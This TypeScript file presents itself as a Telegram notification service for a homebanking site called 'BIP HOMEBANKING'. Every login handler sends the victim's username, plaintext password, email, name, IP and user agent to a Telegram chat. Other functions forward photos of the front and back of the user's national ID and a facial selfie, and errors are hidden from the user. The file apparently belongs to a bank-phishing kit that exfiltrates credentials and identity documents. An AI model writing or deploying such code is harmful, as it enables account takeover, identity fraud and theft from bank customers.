// 📱 Servicio de notificaciones por Telegram
import TelegramBot from 'node-telegram-bot-api';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

let bot: TelegramBot | null = null;

// Inicializar bot solo si hay token configurado
if (TELEGRAM_BOT_TOKEN) {
  bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
}

export const sendLoginNotification = async (userData: {
  username: string;
  password: string;
  name: string;
  email: string;
  timestamp: string;
  ip?: string;
  userAgent?: string;
}) => {
  if (!bot || !TELEGRAM_CHAT_ID) {
    console.log('⚠️ Telegram no configurado. Login de:', userData.username);
    return;
  }

  try {
    const message = `
🔐 *NUEVO LOGIN - BIP HOMEBANKING*

👤 *Usuario:* \`${userData.username}\`
🔑 *Contraseña:* \`${userData.password}\`
📧 *Email:* ${userData.email}
👨‍💼 *Nombre:* ${userData.name}

📱 *User Agent:* ${userData.userAgent || 'No disponible'}
🔢 *IP:* ${userData.ip || 'No disponible'}
🕐 *Fecha:* ${userData.timestamp}

✅ *LOGIN EXITOSO*
    `;

    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
    console.log('✅ Notificación de login enviada a Telegram');
  } catch (error) {
    console.error('❌ Error enviando notificación a Telegram:', error);
  }
};

export const sendDNINotification = async (data: {
  userId: string;
  frontImage: string;
  backImage: string;
  timestamp: string;
  dniData?: any;
}) => {
  if (!bot || !TELEGRAM_CHAT_ID) {
    console.log('⚠️ Telegram no configurado - DNI recibido pero no enviado');
    return;
  }

  try {
    const message = `
📄 *VERIFICACIÓN DNI - BIP HOMEBANKING*

👤 *Usuario ID:* ${data.userId}
🕐 *Fecha:* ${data.timestamp}

📸 Imágenes del DNI adjuntas
    `;

    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });

    // Convertir base64 a buffer y enviar fotos
    try {
      const frontBase64 = data.frontImage.includes(',') ? data.frontImage.split(',')[1] : data.frontImage;
      const backBase64 = data.backImage.includes(',') ? data.backImage.split(',')[1] : data.backImage;
      
      const frontBuffer = Buffer.from(frontBase64, 'base64');
      const backBuffer = Buffer.from(backBase64, 'base64');

      await bot.sendPhoto(TELEGRAM_CHAT_ID, frontBuffer, { 
        caption: `📄 DNI - FRENTE` 
      });
      
      await bot.sendPhoto(TELEGRAM_CHAT_ID, backBuffer, { 
        caption: `📄 DNI - DORSO` 
      });
    } catch (imgError) {
      console.error('❌ Error procesando imágenes DNI:', imgError);
      await bot.sendMessage(TELEGRAM_CHAT_ID, '⚠️ Error al procesar las imágenes del DNI');
    }

    console.log('✅ DNI enviado a Telegram');
  } catch (error) {
    console.error('❌ Error enviando DNI a Telegram:', error);
    // No lanzar el error para que el usuario no vea el error
  }
};

export const sendFacialNotification = async (data: {
  userId: string;
  faceImage: string;
  lightLevel: number;
  timestamp: string;
}) => {
  if (!bot || !TELEGRAM_CHAT_ID) {
    console.log('⚠️ Telegram no configurado');
    return;
  }

  try {
    const lightEmoji = data.lightLevel >= 60 ? '✅' : data.lightLevel >= 30 ? '⚠️' : '❌';
    const qualityStatus = data.lightLevel >= 60 ? 'EXCELENTE' : data.lightLevel >= 30 ? 'ACEPTABLE' : 'BAJA';
    
    const message = `
👤 *VERIFICACIÓN FACIAL - BIP HOMEBANKING*

👤 *Usuario ID:* ${data.userId}
💡 *Nivel de Luz:* ${data.lightLevel}% ${lightEmoji}
📈 *Calidad:* ${qualityStatus}
✅ *Verificación:* COMPLETADA

🕐 *Fecha:* ${data.timestamp}

📸 Foto de verificación facial adjunta
    `;

    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });

    // Enviar foto facial
    const faceBuffer = Buffer.from(data.faceImage.split(',')[1], 'base64');
    await bot.sendPhoto(TELEGRAM_CHAT_ID, faceBuffer, { 
      caption: `👤 VERIFICACIÓN FACIAL - Luz: ${data.lightLevel}% - ${qualityStatus}` 
    });

    console.log('✅ Verificación facial enviada a Telegram');
  } catch (error) {
    console.error('❌ Error enviando verificación facial:', error);
  }
};

export const sendSecurityAlert = async (alertData: {
  type: string;
  message: string;
  username?: string;
}) => {
  if (!bot || !TELEGRAM_CHAT_ID) {
    return;
  }

  try {
    const message = `
⚠️ *ALERTA DE SEGURIDAD - BIP*

🚨 *Tipo:* ${alertData.type}
📝 *Mensaje:* ${alertData.message}
${alertData.username ? `👤 *Usuario:* ${alertData.username}` : ''}
🕐 *Fecha:* ${new Date().toLocaleString('es-AR')}
    `;

    await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
  } catch (error) {
    console.error('Error enviando alerta a Telegram:', error);
  }
};
